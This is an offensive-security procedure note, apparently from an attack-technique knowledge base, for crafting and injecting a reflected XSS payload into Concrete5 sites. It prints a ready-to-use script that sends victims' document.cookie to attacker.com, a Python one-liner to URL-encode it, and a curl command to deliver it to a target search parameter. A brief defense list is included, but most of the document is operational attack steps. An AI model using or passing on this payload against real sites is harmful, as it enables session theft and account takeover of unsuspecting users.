---
tags:
  - xss
  - payload-injection
  - concrete5
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/encode-xss-payload]]'
platforms:
  - Web
techniques:
  - '[[JavaScript]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 49fea305-8ee6-41e0-887a-43a130525607
created_at: '2025-12-14T03:15:35.615Z'
updated_at: '2025-12-14T03:15:35.615Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Craft-and-Inject-XSS-Payload

## Summary

This procedure crafts malicious JavaScript payloads tailored for reflected XSS in Concrete5 and injects them into vulnerable input parameters to execute in the victim's browser.

## Description

Once reflection points are identified, attackers create payloads that perform actions like stealing document.cookie or keylogging. These are URL-encoded to bypass basic filters and injected via GET/POST parameters. In Concrete5's PHP environment, the lack of encoding allows the payload to render as executable script, leading to client-side compromise.

## Requirements

1. Confirmed vulnerable endpoints from reconnaissance
2. Attacker-controlled server for data exfiltration
3. URL encoding capabilities

## Defense

Defensive measures and detection strategies:

- Use strict input validation and output escaping in all user-facing templates
- Enable XSS protection headers like X-XSS-Protection
- Log and alert on suspicious parameter values containing script tags

## Objectives

1. Create executable JavaScript for data theft
2. Ensure payload survives transmission
3. Achieve arbitrary code execution in victim context

## Instructions

### Step 1: Encode Payload for Injection

**Context**: Prepare a payload to exfiltrate session data, encoding it to fit in URLs without breaking the request.

**Command** ([[commands/encode-xss-payload]]):
```bash
python3 -c "import urllib.parse; print(urllib.parse.quote('<script>fetch(\'http://attacker.com/steal?data=\' + btoa(document.cookie))</script>'))"
```

> This outputs an encoded string. Use it in the vulnerable parameter, e.g., ?query=encoded_payload.

### Step 2: Inject and Test Execution

**Context**: Submit the payload to the endpoint and verify execution.

**Command** ([[commands/encode-xss-payload]]):
```bash
curl -G "http://target.concrete5.site/search" --data-urlencode "query=<encoded_payload>"
```

> Load in browser; check network tab for exfiltration request to attacker.com.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/encode-xss-payload]]

## Tools Used


## Tags

- [[xss]]
- [[payload-injection]]
- [[concrete5]]
